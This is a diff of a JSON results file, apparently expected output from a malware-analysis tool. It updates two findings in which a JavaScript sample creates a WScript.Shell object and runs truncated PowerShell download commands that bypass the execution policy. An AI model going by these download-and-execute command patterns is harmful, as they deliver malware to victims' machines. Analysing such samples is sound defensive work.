@@ -60,7 +60,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[19]\n",
+        "body": "JavaScript creates a new Windows Scripting Host Shell Object\n\t\tnew WScript.Shell[14]()\n",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
@@ -82,7 +82,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "JavaScript runs code via shell\n\t\tWScript.Shell[19].Run(powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFile...\n\t\tWScript.Shell[19].Run(powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFile...",
+        "body": "JavaScript runs code via shell\n\t\tWScript.Shell[14].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...\n\t\tWScript.Shell[14].run(\"powershell -Exec Bypass -NoP -C (new-object system.net.webclient).downloadFil...",
         "body_format": "TEXT",
         "classification": "TLP:W",
         "depth": 1,
